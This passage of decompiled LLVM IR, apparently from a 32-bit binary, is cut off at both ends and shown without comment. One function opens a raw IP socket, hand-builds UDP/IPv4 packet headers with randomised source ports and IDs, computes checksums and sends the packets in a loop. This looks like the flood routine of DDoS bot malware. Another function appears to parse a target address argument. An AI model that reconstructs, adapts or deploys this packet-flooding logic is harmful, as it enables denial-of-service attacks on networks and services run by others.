  br i1 %v7_9914, label %dec_label_pc_9968, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %dec_label_pc_98f0
  store i32 %arg2, i32* @r2, align 4
  %v3_9928 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_15b70.96 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9960 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_15ae4.86 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_9968:                                ; preds = %dec_label_pc_98f0
  %v2_996c = load i8, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  %v2_9970 = icmp eq i8 %v2_996c, 0
  br i1 %v2_9970, label %dec_label_pc_9978, label %dec_label_pc_998c

dec_label_pc_9978:                                ; preds = %dec_label_pc_9968
  store i32 %arg2, i32* @r2, align 4
  %v3_9984 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_15b8c.102 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_998c:                                ; preds = %dec_label_pc_9968
  %v1_9990 = add i32 %arg4, 4
  %v1_9994 = inttoptr i32 %v1_9990 to i32*
  %v2_9994 = load i32, i32* %v1_9994, align 4
  %v3_99a0 = call i32 @function_f0f4(i8* bitcast (i32* @global_var_1aaf0.92 to i8*), i32 %v2_9994)
  %v2_99a8 = icmp eq i32 %v3_99a0, 0
  br i1 %v2_99a8, label %dec_label_pc_99c4, label %dec_label_pc_99b0

dec_label_pc_99b0:                                ; preds = %dec_label_pc_998c
  store i32 %arg2, i32* @r2, align 4
  %v3_99bc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_15bac.105 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99c4:                                ; preds = %dec_label_pc_998c
  store i8 0, i8* bitcast (i8** @global_var_18474.23 to i8*), align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_99dc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_15bc8.107 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99b0, %dec_label_pc_9978, %dec_label_pc_991c, %dec_label_pc_99c4
  %v9_99e4 = phi i32 [ %v3_99bc, %dec_label_pc_99b0 ], [ %v3_9984, %dec_label_pc_9978 ], [ %v3_9960, %dec_label_pc_991c ], [ %v3_99dc, %dec_label_pc_99c4 ]
  ret i32 %v9_99e4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_1aaf0.92, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_18474.23 to i8*), { 0, 4, 1, 3, 2 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_99e0, { 3, 0, 1, 2 }
}

define i32 @function_9a0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a0c:
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9a10 = load i32, i32* @r4, align 4
  store i32 %v3_9a10, i32* %stack_var_-20, align 4
  store i32 39448, i32* %stack_var_-4, align 4
  %v16_9a10 = ptrtoint i32* %stack_var_-20 to i32
  %v2_9a14 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a14, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-304, align 4
  %v7_9a30 = icmp eq i32 %arg3, 1
  br i1 %v7_9a30, label %dec_label_pc_9a64, label %dec_label_pc_9a38

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9a0c
  store i32 %arg2, i32* @r2, align 4
  %v3_9a44 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_15be8.109 to i32))
  store i32 0, i32* bitcast (i8** @global_var_18478.33 to i32*), align 4
  store i32 0, i32* @global_var_1847c.35, align 4
  br label %dec_label_pc_9c40

dec_label_pc_9a64:                                ; preds = %dec_label_pc_9a0c
  %v1_9a68 = add i32 %arg4, 4
  %v1_9a6c = inttoptr i32 %v1_9a68 to i32*
  %v2_9a6c = load i32, i32* %v1_9a6c, align 4
  store i32 %v2_9a6c, i32* @r0, align 4
  %v0_9a74 = call i32 @function_ecc0()
  %tmp = icmp ult i32 %v0_9a74, 17
  br i1 %tmp, label %dec_label_pc_9a98, label %dec_label_pc_9a84

dec_label_pc_9a84:                                ; preds = %dec_label_pc_9a64
  store i32 %arg2, i32* @r2, align 4
  %v3_9a90 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_15c08.113 to i32))
  br label %dec_label_pc_9c40

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a64
  %v3_9a98 = load i32, i32* %stack_var_-304, align 4
  %v1_9a9c = add i32 %v3_9a98, 4
  %v1_9aa0 = inttoptr i32 %v1_9a9c to i32*
  %v2_9aa0 = load i32, i32* %v1_9aa0, align 4
  %v2_9aa4 = ptrtoint i32* %stack_var_-288 to i32
  %v2_9ab0 = inttoptr i32 %v2_9aa0 to i8*
  %v3_9ab0 = call i32 @function_ed20(i32 %v2_9aa4, i8* %v2_9ab0)
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9abc = call i32 @function_ecc0()
  %v1_9ac4 = add i32 %v16_9a10, -1
  %v2_9ad4 = add i32 %v1_9ac4, %v0_9abc
  %v2_9ad8 = add i32 %v2_9ad4, -268
  %v1_9adc = inttoptr i32 %v2_9ad8 to i8*
  %v2_9adc = load i8, i8* %v1_9adc, align 1
  %v7_9ae0 = icmp eq i8 %v2_9adc, 46
  br i1 %v7_9ae0, label %dec_label_pc_9ae8, label %dec_label_pc_9b68

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9a98
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9af0 = call i32 @function_ecc0()
  %v1_9af8 = add i32 %v16_9a10, -269
  %v2_9b0c = add i32 %v1_9af8, %v0_9af0
  %v3_9b14 = inttoptr i32 %v2_9b0c to i8*
  store i8 0, i8* %v3_9b14, align 1
  br label %dec_label_pc_9b68

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9b68
  %v2_9b3c = add i32 %stack_var_-32.0, %v16_9a10
  %v2_9b40 = add i32 %v2_9b3c, -268
  %v1_9b44 = inttoptr i32 %v2_9b40 to i8*
  %v2_9b44 = load i8, i8* %v1_9b44, align 1
  %v7_9b48 = icmp eq i8 %v2_9b44, 46
  br i1 %v7_9b48, label %dec_label_pc_9b50, label %dec_label_pc_9b5c

dec_label_pc_9b50:                                ; preds = %dec_label_pc_9b2c
  %v1_9b54 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b2c, %dec_label_pc_9b50
  %stack_var_-28.0 = phi i32 [ %v1_9b54, %dec_label_pc_9b50 ], [ %stack_var_-28.1, %dec_label_pc_9b2c ]
  %v1_9b60 = add i32 %stack_var_-32.0, 1
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9ae8, %dec_label_pc_9a98, %dec_label_pc_9b5c
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_9b5c ], [ 1, %dec_label_pc_9a98 ], [ 1, %dec_label_pc_9ae8 ]
  %stack_var_-32.0 = phi i32 [ %v1_9b60, %dec_label_pc_9b5c ], [ 0, %dec_label_pc_9a98 ], [ 0, %dec_label_pc_9ae8 ]
  store i32 %stack_var_-32.0, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9b74 = call i32 @function_ecc0()
  %v0_9b7c = load i32, i32* @r4, align 4
  %v3_9b7c = icmp ult i32 %v0_9b7c, %v0_9b74
  br i1 %v3_9b7c, label %dec_label_pc_9b2c, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9b68
  %v1_9b88 = sub i32 4, %stack_var_-28.1
  %v3_9be022 = icmp eq i32 %v1_9b88, 0
  %v5_9be427 = icmp sgt i32 %v1_9b88, 0
  br i1 %v5_9be427, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9b9c:                                ; preds = %dec_label_pc_9b84, %dec_label_pc_9b9c
  %storemerge228 = phi i32 [ %v1_9bd0, %dec_label_pc_9b9c ], [ 0, %dec_label_pc_9b84 ]
  store i32 %v2_9aa4, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9ba8 = call i32 @function_ecc0()
  %v0_9bb0 = load i32, i32* @r4, align 4
  %v2_9bb0 = add i32 %v0_9bb0, %v0_9ba8
  store i32 %v2_9bb0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15c54.115 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_9bc8 = call i32 @function_ec10()
  %v1_9bd0 = add nuw nsw i32 %storemerge228, 1
  %v5_9be4 = icmp slt i32 %v1_9bd0, %v1_9b88
  br i1 %v5_9be4, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9be8:                                ; preds = %dec_label_pc_9b9c, %dec_label_pc_9b84
  %v1_9bf0 = call i32 @function_f2a8(i32 %v2_9aa4)
  br i1 %v3_9be022, label %dec_label_pc_9c34, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9be8
  %v2_9c20 = call i32 @function_8c48(i32 256, i32 %v1_9b88)
  br label %dec_label_pc_9c34

dec_label_pc_9c34:                                ; preds = %dec_label_pc_9be8, %dec_label_pc_9c18
  %storemerge = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ 1, %dec_label_pc_9be8 ]
  %v12_9c447 = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ %v1_9bf0, %dec_label_pc_9be8 ]
  store i32 %storemerge, i32* @global_var_1847c.35, align 4
  store i32 %v1_9bf0, i32* bitcast (i8** @global_var_18478.33 to i32*), align 4
  br label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9a84, %dec_label_pc_9a38, %dec_label_pc_9c34
  %v12_9c44 = phi i32 [ %v3_9a90, %dec_label_pc_9a84 ], [ %v3_9a44, %dec_label_pc_9a38 ], [ %v12_9c447, %dec_label_pc_9c34 ]
  ret i32 %v12_9c44

; uselistorder directives
  uselistorder i32 %v1_9bf0, { 1, 0 }
  uselistorder i32 %v1_9bd0, { 1, 0 }
  uselistorder i32 %v1_9b88, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-32.0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v16_9a10, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8c48, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9c40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c34, { 1, 0 }
  uselistorder label %dec_label_pc_9b9c, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9b5c, { 1, 0 }
}

define i32 @function_9c5c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9c5c:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9c60 = load i32, i32* @fp, align 4
  store i32 40040, i32* %stack_var_-4, align 4
  %v2_9c64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c64, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_9c78 = call i32 @function_f3c0(i32 %arg2)
  store i32 %v1_9c78, i32* @global_var_18884.117, align 4
  %v3_9c90 = icmp eq i32 %v1_9c78, -1
  br i1 %v3_9c90, label %dec_label_pc_9c98, label %dec_label_pc_9cfc

dec_label_pc_9c98:                                ; preds = %dec_label_pc_9c5c
  %v3_9c98 = load i32, i32* %stack_var_-28, align 4
  %v1_9c9c = call i32 @function_f3e4(i32 %v3_9c98)
  %v2_9cac = icmp eq i32 %v1_9c9c, 0
  br i1 %v2_9cac, label %dec_label_pc_9cb4, label %dec_label_pc_9cd8

dec_label_pc_9cb4:                                ; preds = %dec_label_pc_9c98
  %v2_9cb8 = load i32, i32* @global_var_1abf8.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_9ccc = call i32 @function_8374(i32 %v2_9cb8, i32 ptrtoint ([33 x i8]* @global_var_15c58.120 to i32))
  %v1_9cd4 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9c98, %dec_label_pc_9cb4
  %v1_9cdc = add i32 %v1_9c9c, 16
  %v2_9cdc = inttoptr i32 %v1_9cdc to i32*
  %v3_9cdc = load i32, i32* %v2_9cdc, align 4
  %v1_9ce0 = inttoptr i32 %v3_9cdc to i32*
  %v2_9ce0 = load i32, i32* %v1_9ce0, align 4
  %v1_9cec = add i32 %v1_9c9c, 12
  %v2_9cec = inttoptr i32 %v1_9cec to i32*
  %v3_9cec = load i32, i32* %v2_9cec, align 4
  store i32 %v3_9cec, i32* @r2, align 4
  %v3_9cf8 = call i32 @function_ec00(i32 %v2_9ce0, i32 ptrtoint (i32* @global_var_18884.117 to i32), i32 %v3_9cec)
  %v2_9d00.pre = load i32, i32* @global_var_18884.117, align 4
  br label %dec_label_pc_9cfc

dec_label_pc_9cfc:                                ; preds = %dec_label_pc_9c5c, %dec_label_pc_9cd8
  %v2_9d00 = phi i32 [ %v1_9c78, %dec_label_pc_9c5c ], [ %v2_9d00.pre, %dec_label_pc_9cd8 ]
  store i32 %v3_9c60, i32* @fp, align 4
  ret i32 %v2_9d00

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_18884.117, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cfc, { 1, 0 }
  uselistorder label %dec_label_pc_9cd8, { 1, 0 }
}

define i32 @function_9d1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9d1c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1544 = alloca i32, align 4
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40232, i32* %stack_var_-4, align 4
  %v2_9d24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d24, i32* @fp, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9d4c = call i32 @function_cb74(i32* null)
  store i32 %v2_9d4c, i32* %r3.global-to-local, align 4
  %v1_9d5c = call i32 @function_83d8(i32 %arg2)
  store i32 %v1_9d5c, i32* %r3.global-to-local, align 4
  %v2_9d64 = icmp eq i32 %v1_9d5c, 0
  br i1 %v2_9d64, label %dec_label_pc_9d6c, label %dec_label_pc_a100

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d1c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_9d78 = call i32 @function_f8dc(i32 2, i32 3, i32 255)
  store i32 %v3_9d78, i32* %r3.global-to-local, align 4
  %v1_9d88 = icmp slt i32 %v3_9d78, 0
  br i1 %v1_9d88, label %dec_label_pc_9d90, label %dec_label_pc_9d98

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d6c
  %v1_9d94 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d6c, %dec_label_pc_9d90
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_9da0 = icmp sgt i32 %arg3, 2
  br i1 %v8_9da0, label %dec_label_pc_9dbc, label %dec_label_pc_9da4

dec_label_pc_9da4:                                ; preds = %dec_label_pc_9d98
  store i32 ptrtoint ([39 x i8]* @global_var_15c7c.122 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9db0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_15c7c.122 to i32))
  %v1_9db8 = call i32 @function_10500(i32 1)
  br label %dec_label_pc_9dbc

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_9d98, %dec_label_pc_9da4
  %v1_9dc0 = add i32 %arg4, 4
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v1_9dc4 = inttoptr i32 %v1_9dc0 to i32*
  %v2_9dc4 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9dc4, i32* %r3.global-to-local, align 4
  store i32 %v2_9dc4, i32* %r1.global-to-local, align 4
  %v2_9dd0 = call i32 @function_9c5c(i32 %arg2, i32 %v2_9dc4)
  %v1_9de0 = add i32 %arg4, 8
  store i32 %v1_9de0, i32* %r3.global-to-local, align 4
  %v1_9de4 = inttoptr i32 %v1_9de0 to i32*
  %v2_9de4 = load i32, i32* %v1_9de4, align 4
  store i32 %v2_9de4, i32* %r3.global-to-local, align 4
  %v1_9dec = inttoptr i32 %v2_9de4 to i8*
  %v2_9dec = call i32 @function_10354(i8* %v1_9dec)
  %v1_9dfc = add i32 %arg4, 12
  store i32 %v1_9dfc, i32* %r3.global-to-local, align 4
  %v1_9e00 = inttoptr i32 %v1_9dfc to i32*
  %v2_9e00 = load i32, i32* %v1_9e00, align 4
  store i32 %v2_9e00, i32* %r3.global-to-local, align 4
  %v1_9e08 = inttoptr i32 %v2_9e00 to i8*
  %v2_9e08 = call i32 @function_10354(i8* %v1_9e08)
  %v2_9e1c = ptrtoint i32* %stack_var_-1572 to i32
  %tmp42 = bitcast i32* %stack_var_-1572 to i8*
  %tmp43 = bitcast i32* %stack_var_-1552 to i8*
  %v2_9e44 = ptrtoint i32* %stack_var_-1544 to i32
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 1472, i32* @r2, align 4
  %v2_9e58 = bitcast i32* %stack_var_-1544 to i8*
  %v3_9e58 = call i32 @function_ec20(i8* %v2_9e58, i32 10)
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v2_9e64 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9e64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_15ca4.124 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9e74 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_15ca4.124 to i32))
  store i8 69, i8* %tmp42, align 4
  %v3_9ec8 = or i32 %v2_9e1c, 1
  %v4_9ec8 = inttoptr i32 %v3_9ec8 to i8*
  store i8 0, i8* %v4_9ec8, align 1
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_9ed8 = or i32 %v2_9e1c, 2
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i8*
  store i8 -36, i8* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* %r2.global-to-local, align 4
  %v1_9edc = trunc i32 %v0_9edc to i8
  %v2_9edc = load i32, i32* %r1.global-to-local, align 4
  %v3_9edc = add i32 %v2_9edc, 3
  %v4_9edc = inttoptr i32 %v3_9edc to i8*
  store i8 %v1_9edc, i8* %v4_9edc, align 1
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ee8 = add i32 %v2_9e1c, 6
  %v4_9ee8 = inttoptr i32 %v3_9ee8 to i8*
  store i8 0, i8* %v4_9ee8, align 2
  %v0_9eec = load i32, i32* %r3.global-to-local, align 4
  %v1_9eec = trunc i32 %v0_9eec to i8
  %v2_9eec = load i32, i32* %r2.global-to-local, align 4
  %v3_9eec = add i32 %v2_9eec, 7
  %v4_9eec = inttoptr i32 %v3_9eec to i8*
  store i8 %v1_9eec, i8* %v4_9eec, align 1
  %v3_9ef8 = add i32 %v2_9e1c, 9
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i8*
  store i8 17, i8* %v4_9ef8, align 1
  %v3_9f04 = add i32 %v2_9e1c, 8
  %v4_9f04 = inttoptr i32 %v3_9f04 to i8*
  store i8 64, i8* %v4_9f04, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v2_9f10 = add i32 %v2_9e1c, 16
  %v3_9f10 = inttoptr i32 %v2_9f10 to i32*
  store i32 %v2_9dd0, i32* %v3_9f10, align 4
  %v3_9f1c = urem i32 %tmp13, 65536
  store i32 %v3_9f1c, i32* %r3.global-to-local, align 4
  %v1_9f24 = call i32 @function_f294(i32 %v3_9f1c)
  %sext = mul i32 %v1_9f24, 16777216
  %v1_9f28 = sdiv i32 %sext, 16777216
  store i32 %v1_9f28, i32* %r3.global-to-local, align 4
  %v4_9f2c = ptrtoint i32* %stack_var_-1552 to i32
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f30 = trunc i32 %v1_9f28 to i8
  %v3_9f30 = add i32 %v4_9f2c, 4
  %v4_9f30 = inttoptr i32 %v3_9f30 to i8*
  store i8 %v1_9f30, i8* %v4_9f30, align 4
  %v0_9f34 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f347 = udiv i32 %v0_9f34, 256
  %v1_9f38 = trunc i32 %v3_9f347 to i8
  %v2_9f38 = load i32, i32* %r2.global-to-local, align 4
  %v3_9f38 = add i32 %v2_9f38, 5
  %v4_9f38 = inttoptr i32 %v3_9f38 to i8*
  store i8 %v1_9f38, i8* %v4_9f38, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v2_9f78 = icmp eq i32 %v2_9dec, 0
  %v3_9fc0 = or i32 %v4_9f2c, 2
  %v4_9fc0 = inttoptr i32 %v3_9fc0 to i8*
  %v3_9ff0 = add i32 %v4_9f2c, 6
  %v4_9ff0 = inttoptr i32 %v3_9ff0 to i8*
  %v2_a008 = add i32 %v2_9e1c, 12
  %v3_a008 = inttoptr i32 %v2_a008 to i32*
  %v3_a020 = add i32 %v2_9e1c, 4
  %v4_a020 = inttoptr i32 %v3_a020 to i8*
  %v3_a050 = add i32 %v2_9e1c, 10
  %v4_a050 = inttoptr i32 %v3_a050 to i8*
  %v2_a07c = ptrtoint i32* %stack_var_-72 to i32
  %v2_a0d4 = add i32 %v2_9e08, %v2_9d4c
  %v3_9f88 = urem i32 %v2_9dec, 65536
  %v3_9f70 = or i32 %v4_9f2c, 1
  %v4_9f70 = inttoptr i32 %v3_9f70 to i8*
  br label %dec_label_pc_9f54

dec_label_pc_9f54:                                ; preds = %dec_label_pc_a0f0, %dec_label_pc_9dbc
  %storemerge = phi i32 [ %v2_9dd0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_9f54 = call i32 @function_fe50()
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f68 = trunc i32 %v0_9f54 to i8
  store i8 %v1_9f68, i8* %tmp43, align 4
  %v3_9f60 = udiv i32 %v0_9f54, 256
  %v1_9f70 = trunc i32 %v3_9f60 to i8
  store i8 %v1_9f70, i8* %v4_9f70, align 1
  store i32 %v2_9dec, i32* %r3.global-to-local, align 4
  br i1 %v2_9f78, label %dec_label_pc_9fac, label %dec_label_pc_9f80

dec_label_pc_9f80:                                ; preds = %dec_label_pc_9f54
  store i32 %v3_9f88, i32* %r3.global-to-local, align 4
  %v1_9f90 = call i32 @function_f294(i32 %v3_9f88)
  %sext3 = mul i32 %v1_9f90, 16777216
  %v1_9f94 = sdiv i32 %sext3, 16777216
  store i32 %v1_9f94, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f9c = trunc i32 %v1_9f94 to i8
  store i8 %v1_9f9c, i8* %v4_9fc0, align 2
  %v0_9fa0 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fa0 = sdiv i32 %v0_9fa0, 256
  store i32 %v3_9fa0, i32* %r3.global-to-local, align 4
  %v1_9fa4 = trunc i32 %v3_9fa0 to i8
  %v2_9fa4 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fa4 = add i32 %v2_9fa4, 3
  %v4_9fa4 = inttoptr i32 %v3_9fa4 to i8*
  store i8 %v1_9fa4, i8* %v4_9fa4, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f54
  %v0_9fac = call i32 @function_fe50()
  %v3_9fb8 = urem i32 %v0_9fac, 65536
  store i32 %v3_9fb8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9fc0 = trunc i32 %v0_9fac to i8
  store i8 %v1_9fc0, i8* %v4_9fc0, align 2
  %v0_9fc4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fc4 = sdiv i32 %v0_9fc4, 256
  store i32 %v3_9fc4, i32* %r3.global-to-local, align 4
  %v1_9fc8 = trunc i32 %v3_9fc4 to i8
  %v2_9fc8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fc8 = add i32 %v2_9fc8, 3
  %v4_9fc8 = inttoptr i32 %v3_9fc8 to i8*
  store i8 %v1_9fc8, i8* %v4_9fc8, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %dec_label_pc_9f80, %dec_label_pc_9fac
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_9fe4 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext4 = mul i32 %v3_9fe4, 16777216
  %v1_9fe8 = sdiv i32 %sext4, 16777216
  store i32 %v1_9fe8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9ff0 = trunc i32 %v1_9fe8 to i8
  store i8 %v1_9ff0, i8* %v4_9ff0, align 2
  %v0_9ff4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9ff4 = sdiv i32 %v0_9ff4, 256
  store i32 %v3_9ff4, i32* %r3.global-to-local, align 4
  %v1_9ff8 = trunc i32 %v3_9ff4 to i8
  %v2_9ff8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 7
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i8*
  store i8 %v1_9ff8, i8* %v4_9ff8, align 1
  %v0_9ffc = call i32 @function_8548()
  store i32 %v0_9ffc, i32* %r2.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 %v0_9ffc, i32* %v3_a008, align 4
  %v0_a00c = call i32 @function_fe50()
  %v3_a018 = urem i32 %v0_a00c, 65536
  store i32 %v3_a018, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a020 = trunc i32 %v0_a00c to i8
  store i8 %v1_a020, i8* %v4_a020, align 4
  %v0_a024 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0248 = udiv i32 %v0_a024, 256
  %v1_a028 = trunc i32 %v3_a0248 to i8
  %v2_a028 = load i32, i32* %r2.global-to-local, align 4
  %v3_a028 = add i32 %v2_a028, 5
  %v4_a028 = inttoptr i32 %v3_a028 to i8*
  store i8 %v1_a028, i8* %v4_a028, align 1
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_a044 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext5 = mul i32 %v3_a044, 16777216
  %v1_a048 = sdiv i32 %sext5, 16777216
  store i32 %v1_a048, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a050 = trunc i32 %v1_a048 to i8
  store i8 %v1_a050, i8* %v4_a050, align 2
  %v0_a054 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0549 = udiv i32 %v0_a054, 256
  %v1_a058 = trunc i32 %v3_a0549 to i8
  %v2_a058 = load i32, i32* %r2.global-to-local, align 4
  %v3_a058 = add i32 %v2_a058, 11
  %v4_a058 = inttoptr i32 %v3_a058 to i8*
  store i8 %v1_a058, i8* %v4_a058, align 1
  store i32 %v3_9fc0, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 1500, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_a0ac = call i32 @function_f878(i32 %v3_9d78, i32* nonnull %stack_var_-1572, i32 1500, i32 0, i32 %v2_a07c, i32 16)
  store i32 %stack_var_-52.0, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i32 %stack_var_-52.0, 50
